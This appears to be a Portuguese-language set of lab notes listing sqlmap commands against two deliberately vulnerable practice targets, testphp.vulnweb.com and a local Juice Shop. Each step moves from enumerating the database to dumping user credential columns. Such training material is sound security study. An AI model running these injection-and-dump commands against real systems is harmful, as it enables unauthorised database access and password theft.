# SQLMap

## Site para testes http://testphp.vulnweb.com
```bash
sqlmap --help
```
```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
```
```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms=mysql -D acuart --tables
```
```bash 
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms=mysql -D acuart -T users --columns
```
```bash 
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms=mysql -D acuart -T users -C name,pass,uname,email --dump
``` 
## Database Schema Juice-Shop

UNION query (U)

```bash
sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite --level=3 --risk=3 --technique=U --threads=4 --schema --no-cast --ignore-code=500
```
```bash
sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite --level=3 --risk=3 --technique=U --threads=4 --tables --no-cast --ignore-code=500
```
```bash
sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite -D SQLite_masterdb -T Users -C email,password,role --dump --threads=4 --no-cast --ignore-code=500
```
Brevity/Boolean-based blind (B)
``` bash
sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite --level=3 --risk=3 --technique=B --threads=4 --schema
```
```bash
sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite --level=3 --risk=3 --technique=B --threads=4 --tables
```
```bash
sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite -D SQLite_masterdb -T Users --dump --threads=4
```
```bash
sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite -D SQLite_masterdb -T Users -C email,password,role --dump --threads=4
```
## Fontes:

https://github.com/sqlmapproject/sqlmap/wiki/Usage

https://github.com/sqlmapproject/sqlmap/wiki/Introduction
